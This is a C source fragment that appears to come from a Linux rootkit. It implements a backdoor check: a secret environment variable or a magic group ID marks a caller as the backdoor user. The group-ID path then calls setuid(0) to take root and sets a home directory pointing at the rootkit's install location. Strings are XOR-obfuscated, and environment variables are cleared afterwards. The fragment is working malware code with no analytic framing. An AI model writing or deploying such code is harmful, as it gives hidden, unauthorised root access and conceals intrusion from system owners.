/* unset variables that we definitely do not need or want set */
void unset_bad_vars(void){
    for(int i = 0; i < UNSET_VARIABLES_SIZE; i++){
        xor(current_variable, unset_variables[i]);
        (void)unsetenv(current_variable);
        clean(current_variable);
    }
    return;
}

int is_bdusr(void){
#ifndef HIDE_SELF
    return 1;
#endif
    if(bdusr != 0){
        unset_bad_vars();
        return bdusr;
    }

    xor(bd_var, BD_VAR);
    /* allow usage of a magic environment variable to grant owner perm */
    if(getenv(bd_var) != NULL && !not_user(0)) bdusr = 1;
    clean(bd_var);

    if(bdusr != 1 && getgid() == MAGIC_GID){
        bdusr = 1;
        (void)setuid(0); 

        /* set our home environment variable */
        char homebuf[PATH_MAX + 6];
        xor(idir, INSTALL_DIR);
        xor(home_str, HOME_VAR_STR);
        (void)snprintf(homebuf, sizeof(homebuf) - 1, home_str, idir);
        clean(home_str);
        clean(idir);
        (void)putenv(homebuf);
    }

    if(bdusr) unset_bad_vars();
    return bdusr;
}